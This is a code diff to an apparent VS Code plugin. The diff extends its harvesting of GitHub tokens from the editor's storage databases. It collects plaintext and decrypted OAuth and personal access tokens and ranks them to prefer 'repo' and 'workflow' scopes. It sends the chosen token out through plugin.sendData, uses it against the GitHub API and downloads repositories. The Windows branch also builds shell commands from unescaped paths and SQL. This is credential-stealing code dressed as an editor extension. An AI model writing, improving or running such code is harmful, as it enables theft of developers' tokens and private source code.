@@ -58,23 +58,56 @@ function safeParse(json) {
 // Run a shell command, return stdout or null
 function execSafe(cmd, options) {
     try {
-        return childProcess.execSync(cmd, Object.assign({ timeout: 10000, encoding: 'utf8' }, options || {})).trim();
+        var opts = Object.assign({ timeout: 10000, encoding: 'utf8' }, options || {});
+        // Ensure Python outputs UTF-8 on Windows (default is system code page like cp1252,
+        // which crashes on emoji/unicode in GitHub API responses, repo descriptions, etc.)
+        if (!opts.env) {
+            try {
+                opts.env = Object.assign({}, process.env, { PYTHONIOENCODING: 'utf-8' });
+            } catch (e) {} // process.env may not be available in all contexts
+        }
+        return childProcess.execSync(cmd, opts).trim();
     } catch (e) {
         return null;
     }
 }
 
-// Query a SQLite .vscdb file using python3 subprocess
+// Query a SQLite .vscdb file using python subprocess
 // Returns parsed JSON array of rows, or null on failure
+var _pythonCmd = null; // cached python command name
+
+function findPython() {
+    if (_pythonCmd) return _pythonCmd;
+    // On Linux/macOS: python3, on Windows: python or py
+    var candidates = platform === 'win32' ? ['python', 'py', 'python3'] : ['python3', 'python'];
+    for (var i = 0; i < candidates.length; i++) {
+        var test = execSafe(candidates[i] + ' --version', { timeout: 3000 });
+        if (test) { _pythonCmd = candidates[i]; return _pythonCmd; }
+    }
+    return null;
+}
+
 function queryVscdb(dbPath, sql) {
     try {
-        // Escape single quotes in paths and SQL
-        var escapedPath = dbPath.replace(/'/g, "'\\''");
-        var escapedSql = sql.replace(/'/g, "'\\''");
-        var pyCmd = "python3 -c \"import sqlite3,json,sys; " +
-            "conn=sqlite3.connect('" + escapedPath + "'); " +
-            "cur=conn.cursor(); cur.execute('" + escapedSql + "'); " +
-            "print(json.dumps(cur.fetchall())); conn.close()\"";
+        var py = findPython();
+        if (!py) return null;
+
+        if (platform === 'win32') {
+            // Windows: use forward slashes in the path for Python, double-quote everything
+            var winPath = dbPath.replace(/\\/g, '/');
+            var pyCmd = py + ' -c "import sqlite3,json,sys; ' +
+                "conn=sqlite3.connect('" + winPath + "'); " +
+                "cur=conn.cursor(); cur.execute('" + sql + "'); " +
+                'print(json.dumps(cur.fetchall())); conn.close()"';
+        } else {
+            // Unix: single-quote escaping
+            var escapedPath = dbPath.replace(/'/g, "'\\''");
+            var escapedSql = sql.replace(/'/g, "'\\''");
+            var pyCmd = py + " -c \"import sqlite3,json,sys; " +
+                "conn=sqlite3.connect('" + escapedPath + "'); " +
+                "cur=conn.cursor(); cur.execute('" + escapedSql + "'); " +
+                "print(json.dumps(cur.fetchall())); conn.close()\"";
+        }
         var result = execSafe(pyCmd, { timeout: 5000 });
         if (result) return safeParse(result);
         return null;
@@ -163,6 +196,28 @@ function discoverWorkspacePath() {
                 storage.windowsState.lastActiveWindow.folder) {
                 var folderPath2 = uriToPath(String(storage.windowsState.lastActiveWindow.folder));
                 if (folderPath2) return folderPath2;
+            }
+        }
+    }
+
+    // Strategy 1b: Read windowsState from state.vscdb (newer VS Code versions
+    // store workspace info here instead of / in addition to storage.json)
+    var globalDb = path.join(globalStorageDir, 'state.vscdb');
+    var wsStateRows = queryVscdb(globalDb, 'SELECT value FROM ItemTable WHERE key = "windowsState"');
+    if (wsStateRows && wsStateRows.length > 0) {
+        var wsState = safeParse(wsStateRows[0][0]);
+        if (wsState) {
+            if (wsState.lastActiveWindow && wsState.lastActiveWindow.folder) {
+                var folderPath3 = uriToPath(String(wsState.lastActiveWindow.folder));
+                if (folderPath3) return folderPath3;
+            }
+            if (wsState.openedWindows) {
+                for (var ow = 0; ow < wsState.openedWindows.length; ow++) {
+                    if (wsState.openedWindows[ow].folder) {
+                        var owPath = uriToPath(String(wsState.openedWindows[ow].folder));
+                        if (owPath) return owPath;
+                    }
+                }
             }
         }
     }
@@ -275,7 +330,7 @@ function queryRendererTabs() {
         '    var label = t.querySelector(".label-name") || t.querySelector(".monaco-icon-label");' +
         '    var title = (label && label.title) || t.title || t.getAttribute("aria-label") || "";' +
         // Extract file path from title (VS Code shows full path in title attr)
-        '    if (title && title.indexOf("/") !== -1 && !seen[title]) {' +
+        '    if (title && (title.indexOf("/") !== -1 || title.indexOf("\\\\") !== -1) && !seen[title]) {' +
         '      seen[title] = true;' +
         '      results.push(title);' +
         '    }' +
@@ -288,7 +343,7 @@ function queryRendererTabs() {
         // aria-label format is often "filename, path/to/file"
         '      var title2 = ariaLabels[j].title || "";' +
         '      var p = title2 || al;' +
-        '      if (p && p.indexOf("/") !== -1 && !seen[p]) {' +
+        '      if (p && (p.indexOf("/") !== -1 || p.indexOf("\\\\") !== -1) && !seen[p]) {' +
         '        seen[p] = true;' +
         '        results.push(p);' +
         '      }' +
@@ -394,7 +449,7 @@ function findOpenEditors() {
             for (var i = 0; i < allRows.length; i++) {
                 var val = allRows[i][1] || '';
                 // Regex scan ALL values for file:// URIs
-                var uriMatches = val.match(/file:\/\/\/[^"'\s,}\]\\]+/g);
+                var uriMatches = val.match(/file:\/\/\/[^"'\s,}\]]+/g);
                 if (uriMatches) {
                     for (var u = 0; u < uriMatches.length; u++) {
                         var p = uriToPath(uriMatches[u]);
@@ -409,9 +464,9 @@ function findOpenEditors() {
                 if (seen[fp]) continue;
                 seen[fp] = true;
                 // Skip VS Code internal paths, .git, and workspace storage paths
-                if (fp.indexOf('/.git/') !== -1) continue;
-                if (fp.indexOf('/workspaceStorage/') !== -1) continue;
-                if (fp.indexOf('/globalStorage/') !== -1) continue;
+                if (fp.indexOf('/.git/') !== -1 || fp.indexOf('\\.git\\') !== -1) continue;
+                if (fp.indexOf('/workspaceStorage/') !== -1 || fp.indexOf('\\workspaceStorage\\') !== -1) continue;
+                if (fp.indexOf('/globalStorage/') !== -1 || fp.indexOf('\\globalStorage\\') !== -1) continue;
                 var st = safeStatSync(fp);
                 if (st && !st.isDirectory()) editors.push(fp);
             }
@@ -440,11 +495,11 @@ function findOpenEditors() {
             var otherFoundPaths = [];
             for (var ow = 0; ow < allOtherRows.length; ow++) {
                 var oval = allOtherRows[ow][0] || '';
-                var oMatches = oval.match(/file:\/\/\/[^"'\s,}\]\\]+/g);
+                var oMatches = oval.match(/file:\/\/\/[^"'\s,}\]]+/g);
                 if (oMatches) {
                     for (var om = 0; om < oMatches.length; om++) {
                         var op = uriToPath(oMatches[om]);
-                        if (op && op.indexOf('/.git/') === -1 && op.indexOf('/workspaceStorage/') === -1) {
+                        if (op && op.indexOf('/.git/') === -1 && op.indexOf('\\.git\\') === -1 && op.indexOf('/workspaceStorage/') === -1 && op.indexOf('\\workspaceStorage\\') === -1) {
                             otherFoundPaths.push(op);
                         }
                     }
@@ -1262,7 +1317,23 @@ function extractGitHubToken() {
         return;
     }
 
-    // Two passes: first try plaintext parsing, then try safeStorage decryption
+    // Collect ALL tokens across all candidates and pick the one with broadest
+    // scopes. VS Code stores multiple sessions (e.g. narrow OAuth for Copilot
+    // + broad OAuth with repo scope), and the first found is not the best.
+    var bestResult = null;
+    var bestScore = -1;
+    var bestSource = '';
+
+    function updateBest(result, source) {
+        if (!result || !result.token) return;
+        var score = tokenScore(result);
+        if (score > bestScore) {
+            bestScore = score;
+            bestResult = result;
+            bestSource = source;
+        }
+    }
+
     // Pass 1: Look for plaintext tokens
     for (var c = 0; c < candidates.length; c++) {
         var val = candidates[c].value;
@@ -1274,34 +1345,22 @@ function extractGitHubToken() {
         if (parsed && parsed.type === 'Buffer' && Array.isArray(parsed.data)) continue;
 
         if (parsed) {
-            var tokenResult = deepFindGitHubToken(parsed);
-            if (tokenResult) {
-                _githubToken = tokenResult.token;
-                _githubAccount = tokenResult.account || '';
-                plugin.sendData('github_token', {
-                    token: tokenResult.token,
-                    account: _githubAccount,
-                    scopes: tokenResult.scopes || [],
-                    source: candidates[c].key
-                });
-                return;
+            var tokenResults = deepFindAllGitHubTokens(parsed);
+            for (var tr = 0; tr < tokenResults.length; tr++) {
+                updateBest(tokenResults[tr], candidates[c].key);
             }
         }
 
         // Raw token string
         if (typeof val === 'string' && (val.indexOf('gho_') === 0 || val.indexOf('ghp_') === 0 || val.indexOf('github_pat_') === 0)) {
-            _githubToken = val;
-            plugin.sendData('github_token', { token: val, account: '', scopes: [], source: candidates[c].key });
-            return;
+            updateBest({ token: val, account: '', scopes: [] }, candidates[c].key);
         }
 
-        // Regex scan raw value
-        if (typeof val === 'string') {
+        // Regex scan raw value (only if not already parsed as JSON)
+        if (!parsed && typeof val === 'string') {
             var tokenMatch = val.match(/(gho_[A-Za-z0-9_]{30,}|ghp_[A-Za-z0-9_]{30,}|github_pat_[A-Za-z0-9_]{30,})/);
             if (tokenMatch) {
-                _githubToken = tokenMatch[1];
-                plugin.sendData('github_token', { token: tokenMatch[1], account: '', scopes: [], source: candidates[c].key + ' (regex)' });
-                return;
+                updateBest({ token: tokenMatch[1], account: '', scopes: [] }, candidates[c].key + ' (regex)');
             }
         }
     }
@@ -1317,34 +1376,37 @@ function extractGitHubToken() {
         // Decrypted value could be a JSON string with session data
         var decParsed = safeParse(decrypted);
         if (decParsed) {
-            var tokenResult2 = deepFindGitHubToken(decParsed);
-            if (tokenResult2) {
-                _githubToken = tokenResult2.token;
-                _githubAccount = tokenResult2.account || '';
-                plugin.sendData('github_token', {
-                    token: tokenResult2.token,
-                    account: _githubAccount,
-                    scopes: tokenResult2.scopes || [],
-                    source: candidates[c2].key + ' (decrypted)'
-                });
-                return;
+            var decTokenResults = deepFindAllGitHubTokens(decParsed);
+            for (var dtr = 0; dtr < decTokenResults.length; dtr++) {
+                updateBest(decTokenResults[dtr], candidates[c2].key + ' (decrypted)');
             }
         }
 
         // Decrypted could be a raw token string
         if (decrypted.indexOf('gho_') === 0 || decrypted.indexOf('ghp_') === 0 || decrypted.indexOf('github_pat_') === 0) {
-            _githubToken = decrypted;
-            plugin.sendData('github_token', { token: decrypted, account: '', scopes: [], source: candidates[c2].key + ' (decrypted)' });
-            return;
+            updateBest({ token: decrypted, account: '', scopes: [] }, candidates[c2].key + ' (decrypted)');
         }
 
-        // Regex scan the decrypted value
-        var decMatch = decrypted.match(/(gho_[A-Za-z0-9_]{30,}|ghp_[A-Za-z0-9_]{30,}|github_pat_[A-Za-z0-9_]{30,})/);
-        if (decMatch) {
-            _githubToken = decMatch[1];
-            plugin.sendData('github_token', { token: decMatch[1], account: '', scopes: [], source: candidates[c2].key + ' (decrypted regex)' });
-            return;
+        // Regex scan the decrypted value (only if not already parsed)
+        if (!decParsed) {
+            var decMatch = decrypted.match(/(gho_[A-Za-z0-9_]{30,}|ghp_[A-Za-z0-9_]{30,}|github_pat_[A-Za-z0-9_]{30,})/);
+            if (decMatch) {
+                updateBest({ token: decMatch[1], account: '', scopes: [] }, candidates[c2].key + ' (decrypted regex)');
+            }
         }
+    }
+
+    // Return the best token found
+    if (bestResult) {
+        _githubToken = bestResult.token;
+        _githubAccount = bestResult.account || '';
+        plugin.sendData('github_token', {
+            token: bestResult.token,
+            account: _githubAccount,
+            scopes: bestResult.scopes || [],
+            source: bestSource
+        });
+        return;
     }
 
     // Didn't find a parseable token — include truncated values and decryption attempts for debugging
@@ -1423,27 +1485,110 @@ function deepFindGitHubToken(obj, depth) {
     return null;
 }
 
+function deepFindAllGitHubTokens(obj) {
+    var results = [];
+    _collectGitHubTokens(obj, results, 0);
+    return results;
+}
+
+function _collectGitHubTokens(obj, results, depth) {
+    if (!obj || typeof obj !== 'object' || depth > 10) return;
+
+    if (Array.isArray(obj)) {
+        for (var i = 0; i < obj.length; i++) {
+            _collectGitHubTokens(obj[i], results, depth + 1);
+        }
+        return;
+    }
+
+    // Check common token property names
+    var tokenProps = ['accessToken', 'access_token', 'token', 'pat', 'oauthToken'];
+    for (var t = 0; t < tokenProps.length; t++) {
+        var tv = obj[tokenProps[t]];
+        if (tv && typeof tv === 'string' && tv.length > 20) {
+            results.push({
+                token: tv,
+                account: (obj.account && (obj.account.label || obj.account.login || obj.account.id)) || obj.login || obj.accountName || '',
+                scopes: obj.scopes || []
+            });
+            return; // Found token at this level, don't recurse deeper
+        }
+    }
+
+    // Check if any string value looks like a GitHub token
+    var keys = Object.keys(obj);
+    for (var k = 0; k < keys.length; k++) {
+        var v = obj[keys[k]];
+        if (typeof v === 'string' && (v.indexOf('gho_') === 0 || v.indexOf('ghp_') === 0 || v.indexOf('github_pat_') === 0)) {
+            results.push({ token: v, account: '', scopes: [] });
+            return;
+        }
+    }
+
+    // Recurse into sub-objects
+    for (var j = 0; j < keys.length; j++) {
+        if (typeof obj[keys[j]] === 'object') {
+            _collectGitHubTokens(obj[keys[j]], results, depth + 1);
+        }
+    }
+}
+
+function tokenScore(result) {
+    if (!result || !result.token) return -1;
+    var scopes = result.scopes || [];
+    var score = scopes.length;
+    for (var i = 0; i < scopes.length; i++) {
+        var s = String(scopes[i]).toLowerCase();
+        if (s === 'repo') score += 100;
+        if (s === 'workflow') score += 10;
+        if (s === 'write:packages') score += 5;
+        if (s === 'read:org') score += 5;
+    }
+    // ghp_ (PAT) and github_pat_ generally have broader permissions than gho_ (OAuth)
+    if (result.token.indexOf('ghp_') === 0 || result.token.indexOf('github_pat_') === 0) score += 3;
+    return score;
+}
+
 function githubApi(endpoint) {
     if (!_githubToken) {
         plugin.sendData('github_data', { endpoint: endpoint, data: null, error: 'No GitHub token extracted' });
         return;
     }
 
-    // Use python3 urllib to call GitHub API
+    // Use python urllib to call GitHub API
+    var py = findPython();
+    if (!py) {
+        plugin.sendData('github_data', { endpoint: endpoint, data: null, error: 'Python not found' });
+        return;
+    }
+    // Single-line Python script (no newlines — cmd.exe on Windows breaks on
+    // multi-line commands inside double quotes). Wraps response with X-OAuth-Scopes
+    // header for diagnostics.
     var pyScript = "import urllib.request,json,sys; " +
         "req=urllib.request.Request(" +
         "'https://api.github.com" + endpoint.replace(/'/g, '') + "', " +
         "headers={'Authorization':'Bearer " + _githubToken + "'," +
         "'User-Agent':'VS-Code-Plugin','Accept':'application/vnd.github.v3+json'}); " +
         "resp=urllib.request.urlopen(req, timeout=15); " +
-        "print(resp.read().decode())";
+        "d=resp.read(); " +
+        "print(json.dumps({'data':json.loads(d),'scopes':resp.headers.get('X-OAuth-Scopes','')}))";
 
-    var result = execSafe('python3 -c "' + pyScript + '"', { timeout: 20000 });
+    var result = execSafe(py + ' -c "' + pyScript + '"', { timeout: 20000 });
     if (result) {
-        var data = safeParse(result);
-        plugin.sendData('github_data', { endpoint: endpoint, data: data });
+        var wrapped = safeParse(result);
+        if (wrapped && wrapped.data !== undefined) {
+            plugin.sendData('github_data', {
+                endpoint: endpoint,
+                data: wrapped.data,
+                tokenScopes: wrapped.scopes || ''
+            });
+        } else {
+            // Fallback: try raw parse (backwards compatible)
+            var data = safeParse(result);
+            plugin.sendData('github_data', { endpoint: endpoint, data: data });
+        }
     } else {
-        plugin.sendData('github_data', { endpoint: endpoint, data: null, error: 'API call failed' });
+        plugin.sendData('github_data', { endpoint: endpoint, data: null, error: 'API call failed (python subprocess error)' });
     }
 }
 
@@ -1499,7 +1644,13 @@ function downloadRepo(repoFullName) {
         return;
     }
 
-    var result = execSafe('python3 ' + tmpScript, { timeout: 180000 });
+    var py2 = findPython();
+    if (!py2) {
+        plugin.sendData('_error', { phase: 'download_repo', error: 'Python not found' });
+        try { fs.unlinkSync(tmpScript); } catch (e) {}
+        return;
+    }
+    var result = execSafe(py2 + ' ' + tmpScript, { timeout: 180000 });
 
     // Clean up script
     try { fs.unlinkSync(tmpScript); } catch (e) {}
